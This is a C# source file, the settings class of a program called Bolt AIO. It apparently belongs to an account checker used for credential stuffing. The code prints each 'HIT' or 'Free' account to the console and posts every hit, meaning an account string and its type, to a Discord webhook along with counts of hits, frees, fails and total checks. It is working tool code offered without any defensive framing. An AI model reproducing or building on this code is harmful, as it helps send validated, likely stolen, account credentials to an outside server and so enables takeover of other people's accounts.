using System.Drawing;
using System.IO;
using System.Net;
using BoltCUI;
using Colorful;
using Newtonsoft.Json;

namespace Bolt_AIO
{
    internal class Settings
    {
        public static bool sendToWebhook = false;
        public static string webHook = "";
        public static string DiscordID;
        public static int refreshRate = 0;

        public static void PrintHit(string type, string account)
        {
            Console.Write("    [", Color.White);
            Console.Write("HIT", Color.LimeGreen);
            Console.Write("] " + account + " | " + type + "\n", Color.White);
        }

        public static void PrintFree(string type, string account)
        {
            Console.Write("    [", Color.White);
            Console.Write("Free", Color.OrangeRed);
            Console.Write("] " + account + " | " + type + "\n", Color.White);
        }

        public static void sendTowebhook1(string account, string accountType)
        {
            WebRequest wr = (HttpWebRequest) WebRequest.Create(webHook);

            wr.ContentType = "application/json";

            wr.Method = "POST";

            using (var sw = new StreamWriter(wr.GetRequestStream()))
            {
                var json = JsonConvert.SerializeObject(new
                {
                    username = "Bolt AIO",
                    avatar_url =
                        "https://cdn.discordapp.com/attachments/708528132327735427/781294769375674378/Bolt_Logo.png",
                    embeds = new[]
                    {
                        new
                        {
                            description = $"[HIT] | {account} | {accountType}",
                            title = "Bolt AIO",
                            color = "9396455",

                            footer = new
                            {
                                icon_url =
                                    "https://cdn.discordapp.com/icons/781049455831023616/56dac6e51b6887b8d4a87ee724ba929a.webp?size=128",
                                text =
                                    $"[Bolt AIO] | [HITS] {Program.Hits} - [FREES] {Program.Frees} - [FAILS] {Program.Fails} - [TOTAL] {Program.TotalChecks}"
                            }
                        }
                    }
                });

                sw.Write(json);
            }

            var response = (HttpWebResponse) wr.GetResponse();
        }
    }
}